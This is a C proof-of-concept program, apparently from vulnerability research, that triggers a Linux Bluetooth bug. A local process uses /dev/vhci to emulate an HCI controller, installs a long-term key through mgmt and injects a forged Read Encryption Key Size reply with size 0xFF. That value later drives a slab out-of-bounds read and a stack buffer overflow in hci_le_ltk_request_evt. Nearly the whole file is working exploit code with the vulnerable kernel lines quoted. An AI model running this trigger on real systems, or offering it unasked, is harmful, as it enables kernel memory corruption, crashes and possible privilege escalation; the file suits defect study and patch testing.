/* Candidate C4: unbounded encryption key size -> slab over-read + stack smash.
 *
 * net/bluetooth/hci_event.c:745,769 (hci_cc_read_enc_key_size)
 *
 *      conn->enc_key_size = rp->key_size;      / * raw u8 off the wire, 0..255 * /
 *      ...
 *      if (conn->enc_key_size < hdev->min_enc_key_size ||
 *          (key_enc_size && conn->enc_key_size < *key_enc_size)) { ... }
 *      ...
 *      if (key_enc_size && *key_enc_size != conn->enc_key_size)
 *              *key_enc_size = conn->enc_key_size;      / * NO UPPER BOUND * /
 *
 * The two checks are DOWNGRADE checks only ("<"); nothing rejects a value
 * above 16. For an LE link hci_conn_key_enc_size() returns &ltk->enc_size of
 * the stored struct smp_ltk, whose val[] is 16 bytes. The bound that normally
 * protects that field -- ltk_is_valid() (mgmt.c, rejects enc_size >
 * sizeof(val)) and check_enc_key_size() (smp.c) -- are both applied when the
 * key is *installed*; this write happens afterwards and bypasses them.
 *
 * The corrupted field is then a memcpy length in hci_le_ltk_request_evt()
 * (hci_event.c:6720):
 *
 *      struct hci_cp_le_ltk_reply cp;          / * 18 bytes, ON THE STACK * /
 *      memcpy(cp.ltk, ltk->val, ltk->enc_size);
 *      memset(cp.ltk + ltk->enc_size, 0, sizeof(cp.ltk) - ltk->enc_size);
 *
 * With enc_size = 0xFF that is a 255-byte read out of a 16-byte field inside a
 * ~56-byte slab object (KASAN slab-out-of-bounds), a 255-byte write into a
 * 16-byte stack array (STACKPROTECTOR_STRONG), and then a memset whose length
 * 16 - 255 underflows size_t to ~2^64.
 *
 * Nothing here needs a remote peer: /dev/vhci (CONFIG_BT_HCIVHCI=y) lets a
 * local process feed arbitrary HCI events to the stack. The Command Complete
 * is accepted unsolicited -- hci_cmd_complete_evt picks the handler purely
 * from the opcode carried in the event itself.
 */
#include "common.h"
#include <sys/wait.h>
#include <poll.h>

#define HCI_COMMAND_PKT 0x01
#define HCI_EVENT_PKT   0x04
#define HCI_VENDOR_PKT  0xff

#define AF_BLUETOOTH_   31
#define BTPROTO_HCI     1
#define HCI_CHANNEL_CONTROL 3
#define HCI_DEV_NONE    0xffff
#define HCIDEVUP        _IOW('H', 201, int)

#define MGMT_OP_LOAD_LONG_TERM_KEYS 0x0013

struct sockaddr_hci {
	unsigned short hci_family;
	unsigned short hci_dev;
	unsigned short hci_channel;
};

static int vfd = -1;

static void vwrite(const unsigned char *buf, int len)
{
	if (write(vfd, buf, len) != len)
		logf("WARN: vhci write failed: %s", strerror(errno));
}

/* --- controller emulation -------------------------------------------------
 * The kernel will not set HCI_UP until its init command sequence completes,
 * so every command it sends has to be answered. Answering generically
 * (status 0 + a block of zeros) is enough for almost all of them: the cc
 * handlers only require skb->len >= min_len and trailing bytes are ignored.
 * The exceptions are the few whose *values* decide whether LE is usable.
 */
static void respond_cmd_complete(unsigned short opcode, const unsigned char *params, int plen)
{
	unsigned char ev[300];
	int n = 0;

	ev[n++] = HCI_EVENT_PKT;
	ev[n++] = 0x0e;                 /* HCI_EV_CMD_COMPLETE */
	ev[n++] = 0;                    /* plen, patched below */
	ev[n++] = 1;                    /* ncmd */
	ev[n++] = opcode & 0xff;
	ev[n++] = (opcode >> 8) & 0xff;
	ev[n++] = 0x00;                 /* status = success */
	if (plen > 0) {
		memcpy(ev + n, params, plen);
		n += plen;
	}
	ev[2] = n - 3;
	vwrite(ev, n);
}

static void responder_loop(void)
{
	unsigned char buf[4096];
	unsigned char params[128];
	int n;

	for (;;) {
		n = read(vfd, buf, sizeof(buf));
		if (n < 0) {
			if (errno == EINTR || errno == EAGAIN)
				continue;
			_exit(0);
		}
		if (n < 4 || buf[0] != HCI_COMMAND_PKT)
			continue;

		{
			unsigned short opcode = buf[1] | (buf[2] << 8);

			memset(params, 0, sizeof(params));

			switch (opcode) {
			case 0x1003: /* Read Local Features: advertise LE support */
				params[4] = 0x40;         /* LMP_LE  */
				params[6] = 0x20;         /* LMP_LE_BREDR */
				respond_cmd_complete(opcode, params, 8);
				break;
			case 0x1005: /* Read Buffer Size: non-zero MTUs */
				params[0] = 0xff; params[1] = 0x00;   /* acl_mtu */
				params[2] = 0x08;                     /* sco_mtu */
				params[3] = 0x10; params[4] = 0x00;   /* acl_max_pkt */
				params[5] = 0x10; params[6] = 0x00;   /* sco_max_pkt */
				respond_cmd_complete(opcode, params, 7);
				break;
			case 0x1009: /* Read BD Addr */
				params[0] = 0x11; params[1] = 0x22; params[2] = 0x33;
				params[3] = 0x44; params[4] = 0x55; params[5] = 0x66;
				respond_cmd_complete(opcode, params, 6);
				break;
			case 0x2002: /* LE Read Buffer Size */
				params[0] = 0x1b; params[1] = 0x00;   /* le_mtu */
				params[2] = 0x08;                     /* le_max_pkt */
				respond_cmd_complete(opcode, params, 3);
				break;
			case 0x2003: /* LE Read Local Supported Features */
				params[0] = 0x01;         /* LE Encryption */
				respond_cmd_complete(opcode, params, 8);
				break;
			case 0x200f: /* LE Read White List Size */
			case 0x202a: /* LE Read Resolving List Size */
				params[0] = 0x10;
				respond_cmd_complete(opcode, params, 1);
				break;
			default:
				/* Generic: status + 96 zero bytes satisfies min_len
				 * for every remaining cc handler. */
				respond_cmd_complete(opcode, params, 96);
				break;
			}
		}
	}
}

/* --- event injection ------------------------------------------------------ */
static void inject_le_conn_complete(unsigned short handle)
{
	unsigned char ev[] = {
		HCI_EVENT_PKT, 0x3e, 0x13, 0x01,   /* LE Meta, subevent 0x01 */
		0x00,                              /* status */
		handle & 0xff, (handle >> 8) & 0xff,
		0x01,                              /* role = peripheral (HCI_ROLE_SLAVE) */
		0x00,                              /* peer addr type = public */
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,/* peer addr */
		0x18, 0x00,                        /* interval */
		0x00, 0x00,                        /* latency */
		0x2a, 0x00,                        /* supervision timeout */
		0x00,                              /* clock accuracy */
	};
	logf("inject LE Connection Complete handle=0x%04x", handle);
	vwrite(ev, sizeof(ev));
}

/* The defect: unsolicited Command Complete for Read Encryption Key Size
 * carrying an out-of-range key_size, which is written straight into
 * ltk->enc_size. */
static void inject_bad_enc_key_size(unsigned short handle, unsigned char key_size)
{
	unsigned char ev[] = {
		HCI_EVENT_PKT, 0x0e, 0x07,
		0x01,                              /* ncmd */
		0x08, 0x14,                        /* HCI_OP_READ_ENC_KEY_SIZE (0x1408) */
		0x00,                              /* status */
		handle & 0xff, (handle >> 8) & 0xff,
		key_size,                          /* <-- unbounded */
	};
	logf("inject CC READ_ENC_KEY_SIZE handle=0x%04x key_size=%u", handle, key_size);
	vwrite(ev, sizeof(ev));
}

static void inject_ltk_request(unsigned short handle)
{
	unsigned char ev[] = {
		HCI_EVENT_PKT, 0x3e, 0x0d, 0x05,   /* LE Meta, subevent 0x05 */
		handle & 0xff, (handle >> 8) & 0xff,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,  /* rand */
		0x34, 0x12,                        /* ediv */
	};
	logf("inject LE LTK Request handle=0x%04x  <-- TRIGGER", handle);
	vwrite(ev, sizeof(ev));
}

/* --- mgmt ----------------------------------------------------------------- */
static int mgmt_load_ltk(int mfd, unsigned short index)
{
	unsigned char msg[6 + 2 + 36];
	unsigned char *p = msg;
	unsigned char *k;

	*p++ = MGMT_OP_LOAD_LONG_TERM_KEYS & 0xff;
	*p++ = MGMT_OP_LOAD_LONG_TERM_KEYS >> 8;
	*p++ = index & 0xff;
	*p++ = index >> 8;
	*p++ = (2 + 36) & 0xff;
	*p++ = (2 + 36) >> 8;

	*p++ = 0x01; *p++ = 0x00;          /* key_count = 1 */

	k = p;
	memset(k, 0, 36);
	k[0] = 0xAA; k[1] = 0xAA; k[2] = 0xAA;
	k[3] = 0xAA; k[4] = 0xAA; k[5] = 0xAA;   /* bdaddr */
	k[6] = 0x01;                             /* BDADDR_LE_PUBLIC */
	k[7] = 0x00;                             /* type = SMP_LTK (non-SC) */
	k[8] = 0x00;                             /* initiator */
	k[9] = 0x10;                             /* enc_size = 16 (must pass ltk_is_valid) */
	k[10] = 0x34; k[11] = 0x12;              /* ediv = 0x1234 */
	k[12] = 0x88; k[13] = 0x77; k[14] = 0x66; k[15] = 0x55;
	k[16] = 0x44; k[17] = 0x33; k[18] = 0x22; k[19] = 0x11;  /* rand */
	memset(k + 20, 0x41, 16);                /* val[16] */

	if (write(mfd, msg, sizeof(msg)) != (ssize_t)sizeof(msg)) {
		logf("mgmt write failed: %s", strerror(errno));
		return -1;
	}
	return 0;
}

int main(void)
{
	int mfd, hfd, pid, i;
	struct sockaddr_hci sa;
	unsigned short handle = 0x0001;

	logf("=== BT unbounded enc_key_size -> OOB (C4) ===");

	vfd = open("/dev/vhci", O_RDWR);
	if (vfd < 0)
		die("open /dev/vhci (CONFIG_BT_HCIVHCI)");
	logf("opened /dev/vhci");

	/* Create the virtual controller immediately rather than waiting for the
	 * driver's open-timeout to do it. */
	{
		unsigned char create[2] = { HCI_VENDOR_PKT, 0x00 };
		vwrite(create, sizeof(create));
	}
	sleep(1);

	/* The init handshake needs a responder running concurrently with the
	 * blocking HCIDEVUP ioctl, so fork one. */
	pid = fork();
	if (pid == 0) {
		responder_loop();
		_exit(0);
	}
	if (pid < 0)
		die("fork");

	sleep(1);

	hfd = socket(AF_BLUETOOTH_, SOCK_RAW, BTPROTO_HCI);
	if (hfd < 0) {
		logf("socket(BTPROTO_HCI) failed: %s", strerror(errno));
		goto out;
	}
	for (i = 0; i < 4; i++) {
		if (ioctl(hfd, HCIDEVUP, i) == 0) {
			logf("HCIDEVUP hci%d ok", i);
			break;
		}
		logf("HCIDEVUP hci%d -> %s", i, strerror(errno));
		if (errno == EALREADY || errno == EBUSY) { logf("hci%d already up", i); break; }
	}
	sleep(1);

	/* mgmt channel: install a well-formed LTK (enc_size = 16). */
	mfd = socket(AF_BLUETOOTH_, SOCK_RAW, BTPROTO_HCI);
	if (mfd < 0) {
		logf("socket(mgmt) failed: %s", strerror(errno));
		goto out;
	}
	memset(&sa, 0, sizeof(sa));
	sa.hci_family = AF_BLUETOOTH_;
	sa.hci_dev = HCI_DEV_NONE;
	sa.hci_channel = HCI_CHANNEL_CONTROL;
	if (bind(mfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		logf("bind(mgmt) failed: %s", strerror(errno));
		goto out;
	}
	logf("mgmt socket bound");

	for (i = 0; i < 2; i++) {
		if (mgmt_load_ltk(mfd, i) == 0)
			logf("sent LOAD_LONG_TERM_KEYS for index %d", i);
		usleep(200000);
	}
	sleep(1);

	inject_le_conn_complete(handle);
	sleep(1);

	/* Corrupt ltk->enc_size well past sizeof(ltk->val). */
	inject_bad_enc_key_size(handle, 0xFF);
	sleep(1);

	/* Consume it as a memcpy length. */
	inject_ltk_request(handle);
	sleep(2);

	logf("trigger sequence complete");

out:
	if (pid > 0) {
		kill(pid, SIGKILL);
		waitpid(pid, NULL, 0);
	}
	return 0;
}
